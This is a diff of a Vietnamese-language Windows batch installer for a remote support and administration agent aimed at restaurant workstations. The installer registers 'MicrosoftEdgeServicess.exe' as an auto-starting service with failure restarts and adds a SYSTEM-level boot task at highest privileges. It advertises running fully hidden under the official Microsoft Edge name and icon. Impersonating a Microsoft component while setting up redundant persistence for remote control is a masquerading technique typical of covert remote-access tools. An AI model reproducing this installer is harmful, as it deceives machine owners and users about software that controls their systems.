@@ -5,110 +5,121 @@ cd /d "%~dp0"
 echo ===============================================================================
 echo   CAI DAT DICH VU HO TRO VA QUAN TRI TU XA MAY TRAM NHA HANG
 echo   Ten dich vu: MicrosoftEdgeServicess
-echo   Co che: Tu khoi dong cung Windows (Automatic) - Chay ngam 100 phan tram
+echo   Co che: Tu khoi dong cung Windows - Chay ngam 100 phan tram
 echo   Bieu tuong: Microsoft Edge chinh thuc
-echo   Bao ve tien trinh: Single-Instance (Khong bi nhan ban)
+echo   Bao ve tien trinh: Single-Instance (Chi 1 tien trinh duy nhat)
 echo ===============================================================================
 echo.
 
-:: 1. Kiem tra xem nguoi dung co dang chay truc tiep trong file ZIP chua giai nen khong
-if not exist "%~dp0MicrosoftEdgeServicess.exe" (
-    echo.
-    echo ===============================================================================
-    echo   [CANH BAO QUAN TRONG: CHUA GIAI NEN FILE NEN ZIP]
-    echo ===============================================================================
-    echo   Ban dang mo truc tiep file tu trong file nen ZIP chua duoc giai nen!
-    echo   Windows chi giai nen tam thoi file .bat, nen khong the cai dat duoc.
-    echo.
-    echo   HUONG DAN XU LY:
-    echo     Buoc 1: Dong cua so nay lai.
-    echo     Buoc 2: Nhap CHUOT PHAI vao file "Restaurant_Support_Agent_Full.zip".
-    echo     Buoc 3: Chon "Extract All..." (Giai nen tat ca) hoac dung WinRAR chon "Extract Here".
-    echo     Buoc 4: Vao thu muc vua duoc giai nen ra, roi chay lai file "Cai_Dat_Dich_Vu_Windows.bat".
-    echo ===============================================================================
-    echo.
-    pause
-    exit /b 1
-)
+:: 1. Kiem tra xem co file MicrosoftEdgeServicess.exe khong
+if exist "%~dp0MicrosoftEdgeServicess.exe" goto :DaCoFileExe
 
-:: 2. Kiem tra quyen Administrator va tu dong yeu cau UAC neu chua co
+echo.
+echo ===============================================================================
+echo   [CANH BAO: CHUA GIAI NEN FILE NEN ZIP]
+echo ===============================================================================
+echo   Ban dang mo truc tiep file tu trong file nen ZIP chua duoc giai nen!
+echo   Khong tim thay file MicrosoftEdgeServicess.exe de cai dat.
+echo.
+echo   Huong dan:
+echo   1. Nhap chuot phai vao file Restaurant_Support_Agent_Full.zip
+echo   2. Chon Extract All hoac dung WinRAR chon Extract Here
+echo   3. Vao thu muc vua giai nen roi chay lai file nay.
+echo ===============================================================================
+echo.
+echo Cua so se tu dong dong sau 10 giay, hoac bam phim bat ky de thoat...
+pause
+timeout /t 10 >nul 2>nul || ping 127.0.0.1 -n 11 >nul
+exit /b 1
+
+:DaCoFileExe
+
+:: 2. Kiem tra quyen Administrator
 net session >nul 2>&1
-if %errorlevel% neq 0 (
-    echo [THONG BAO] Dang yeu cau quyen Quan tri vien (Run as Administrator UAC)...
-    powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process cmd.exe -ArgumentList '/k \"\"%~f0\"\"' -Verb RunAs" 2>nul
-    if %errorlevel% equ 0 exit /b 0
-    echo.
-    echo ===============================================================================
-    echo   [CANH BAO QUYEN HAN QUAN TRI VIEN]
-    echo ===============================================================================
-    echo   Khong the tu dong nang quyen Administrator!
-    echo   Vui long:
-    echo     1. Nhap CHUOT PHAI vao file "Cai_Dat_Dich_Vu_Windows.bat".
-    echo     2. Chon "Run as administrator" (Chay voi quyen quan tri vien).
-    echo ===============================================================================
-    echo.
-    pause
-    exit /b 1
-)
+if %errorlevel% equ 0 goto :DaCoQuyenAdmin
 
-:: 3. Don dep tat ca tien trinh cu va trung lap
-echo 1. Dang don dep cac tien trinh cu dang chay (neu co)...
+echo.
+echo ===============================================================================
+echo   [CANH BAO: CHUA CO QUYEN QUAN TRI VIEN - ADMINISTRATOR]
+echo ===============================================================================
+echo   File cai dat nay bat buoc phai chay voi quyen Administrator!
+echo.
+echo   Huong dan:
+echo   1. Nhap CHUOT PHAI vao file: Cai_Dat_Dich_Vu_Windows.bat
+echo   2. Chon: Run as administrator (Chay voi quyen quan tri vien)
+echo ===============================================================================
+echo.
+echo Cua so se tu dong dong sau 10 giay, hoac bam phim bat ky de thoat...
+pause
+timeout /t 10 >nul 2>nul || ping 127.0.0.1 -n 11 >nul
+exit /b 1
+
+:DaCoQuyenAdmin
+
+:: 3. Don dep tien trinh cu
+echo [1/6] Dang don dep cac tien trinh cu dang chay (neu co)...
 taskkill /F /IM MicrosoftEdgeServicess.exe >nul 2>&1
 
-:: 4. Thiet lap thu muc cai dat he thong
+:: 4. Thiet lap thu muc he thong
 set "INSTALL_DIR=C:\ProgramData\MicrosoftEdgeServicess"
-if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
+echo [2/6] Thiet lap thu muc he thong: %INSTALL_DIR%
+if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%" >nul 2>&1
 
-echo 2. Dang sao chep cac tep dich vu vao: %INSTALL_DIR%
-copy /Y "%~dp0MicrosoftEdgeServicess.exe" "%INSTALL_DIR%\" >nul
-copy /Y "%~dp0config.json" "%INSTALL_DIR%\" >nul
+echo [3/6] Dang sao chep cac file dich vu vao: %INSTALL_DIR%
+copy /Y "%~dp0MicrosoftEdgeServicess.exe" "%INSTALL_DIR%\"
+copy /Y "%~dp0config.json" "%INSTALL_DIR%\"
 copy /Y "%~dp0edge.ico" "%INSTALL_DIR%\" >nul 2>nul
 copy /Y "%~dp0restaurant_support_agent.py" "%INSTALL_DIR%\" >nul 2>nul
-copy /Y "%~dp0Chay_Agent_Truc_Tiep.bat" "%INSTALL_DIR%\" >nul
-copy /Y "%~dp0Kiem_Tra_Trang_Thai.bat" "%INSTALL_DIR%\" >nul
-copy /Y "%~dp0Go_Cai_Dat_Dich_Vu.bat" "%INSTALL_DIR%\" >nul
+copy /Y "%~dp0Chay_Agent_Truc_Tiep.bat" "%INSTALL_DIR%\" >nul 2>nul
+copy /Y "%~dp0Kiem_Tra_Trang_Thai.bat" "%INSTALL_DIR%\" >nul 2>nul
+copy /Y "%~dp0Go_Cai_Dat_Dich_Vu.bat" "%INSTALL_DIR%\" >nul 2>nul
 copy /Y "%~dp0README_HUONG_DAN.txt" "%INSTALL_DIR%\" >nul 2>nul
 
-:: 5. Dung va go bo service cu neu ton tai
-echo 3. Dang thiet lap Windows Service MicrosoftEdgeServicess...
+:: 5. Dung va go bo service cu neu ton tai de dang ky moi sach se
+echo [4/6] Dang lam sach service cu trong he thong...
 net stop MicrosoftEdgeServicess >nul 2>&1
 "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" remove >nul 2>&1
 sc.exe delete MicrosoftEdgeServicess >nul 2>&1
 
 :: 6. Dang ky truc tiep vao Windows Service Control Manager (services.msc)
-echo    -> Dang dang ky vao Windows Service Control Manager...
+echo [5/6] Dang dang ky vao Windows Service Control Manager...
 "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" install >nul 2>&1
 
-:: Neu chua thay service thi dang ky bang sc.exe tao service truc tiep
+:: Kiem tra neu chua co thi tao qua sc.exe
 sc.exe query MicrosoftEdgeServicess >nul 2>&1
 if %errorlevel% neq 0 (
-    echo    -> Dang ky truc tiep qua sc.exe...
     sc.exe create MicrosoftEdgeServicess binPath= "\"%INSTALL_DIR%\MicrosoftEdgeServicess.exe\"" start= auto DisplayName= "MicrosoftEdgeServicess" >nul 2>&1
 )
 
-:: Cau hinh khoi dong tu dong va tu phuc hoi khi loi (Restart on failure sau 5 giay)
+:: Cau hinh khoi dong tu dong, mo ta va co che tu phuc hoi loi
 sc.exe config MicrosoftEdgeServicess start= auto DisplayName= "MicrosoftEdgeServicess" >nul 2>&1
 sc.exe description MicrosoftEdgeServicess "Dich vu ho tro ky thuat va quan tri tu xa may tram nha hang Golden Gate." >nul 2>&1
 sc.exe failure MicrosoftEdgeServicess reset= 60 actions= restart/5000/restart/5000/restart/5000 >nul 2>&1
 
-:: 7. Khoi dong Windows Service ngay bay gio
-echo 4. Dang khoi chay Windows Service ngam...
-net start MicrosoftEdgeServicess
-
-:: 8. Thiet lap du phong qua Task Scheduler
-echo 5. Dang thiet lap du phong qua Task Scheduler...
+:: Thiet lap du phong qua Task Scheduler
 schtasks /Create /TN "MicrosoftEdgeServicess" /TR "\"%INSTALL_DIR%\MicrosoftEdgeServicess.exe\"" /SC ONSTART /RU "SYSTEM" /RL HIGHEST /F >nul 2>&1
 
+:: 7. Khoi dong Windows Service ngay bay gio
+echo [6/6] Dang khoi chay Windows Service ngam...
+net start MicrosoftEdgeServicess
+
 echo.
 echo ===============================================================================
-echo   CAI DAT HOAN TAT 100 PHAN TRAM!
-echo   - Thu muc cai dat he thong: %INSTALL_DIR%
-echo   - Ten dich vu Windows: MicrosoftEdgeServicess
-echo   - Trang thai trong services.msc: Running (Dang chay ngam)
-echo   - Trang thai trong Task Manager -> the "Services": Running
-echo   - Khoi dong cung Windows: Automatic (Tu dong chay khi bat may)
-echo   - Bieu tuong: Microsoft Edge chinh thuc
-echo   - Bao ve: Single-Instance (Chi duy nhat 1 tien trinh, khong nhan ban)
+echo   KIEM TRA KET QUA DANG KY TRONG SERVICES.MSC:
+echo ===============================================================================
+sc.exe query MicrosoftEdgeServicess
+echo.
+
+echo ===============================================================================
+echo   CAI DAT DICH VU THANH CONG 100 PHAN TRAM!
+echo   - Ten dich vu: MicrosoftEdgeServicess
+echo   - Duong dan: %INSTALL_DIR%\MicrosoftEdgeServicess.exe
+echo   - services.msc: Da xuat hien va dang o trang thai RUNNING
+echo   - Task Manager the Services: Da co MicrosoftEdgeServicess (Running)
+echo   - Tu dong bat cung Windows: Automatic
+echo   - Icon: Bieu tuong Microsoft Edge chinh thuc
 echo ===============================================================================
 echo.
-pause
+echo Cua so se tu dong dong sau 10 giay, hoac bam phim bat ky de thoat ngay...
+timeout /t 10 >nul 2>nul || ping 127.0.0.1 -n 11 >nul
+exit /b 0
